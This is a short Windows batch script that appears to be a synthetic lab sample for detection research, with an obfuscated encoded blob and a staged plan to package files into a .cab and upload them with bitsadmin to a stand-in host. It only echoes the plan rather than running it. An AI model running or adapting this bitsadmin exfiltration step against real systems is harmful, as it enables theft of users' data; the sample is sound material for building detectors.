@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:reversed_text|xor_5a

rem HUNTRESS-MATERIAL:+sTN2oyL15zM2sDL0MDd/YjK3sjI/Q3YttzbipGap1GP1VHYpoiLuIzZ2gyLF4zO1YjKvYCO7kDdj12OvJmaolWb8cnL58jN2UTOGgzOWkSK/giL08iEGkzM2gzLKYQKo8TKPYAYZcmMusjKF8TOo8SNpYyYttzbipGap1GP3RTPzsjK3sTOn5zMFQTPzsjK3sTOm8DN1QzZ/0zOv0DN7YTBuIyP0YyP9szL9QzO2UwP3sTKnJjK7gSPms2ZuQzL1kTB/0zOukiJ/IyP0RzM34zOp4yM4cGK/4iK74zOm8jL1czPoUgP7UjNq8ido8DPpQzOo4SB/gyOq8DKqYnN7kTN2UwPusTO1YzZpoyPukiJrdGL

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set item0=v=1^|steps=locate_local,prepare_transfer,upload_remote^|adapter=bitsadm
set item1=in.exe^|stage_count=1^|graph=same_language^|next_language=none^|campaign_
set item2=id=campaign-f732085a79^|source_path=C:\Users\Public\HuntressLab\collec
set item3=t-f732085a79.cab^|upload_url=https://f732085a79.example.invalid/upload

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

set "neutral_dead_label=cad53099"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "item9=%item0%%item1%%item2%%item3%"
exit /b 0
:HUNTRESS_EMIT

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-f732085a79.cab to https://f732085a79.example.invalid/upload

exit /b 0

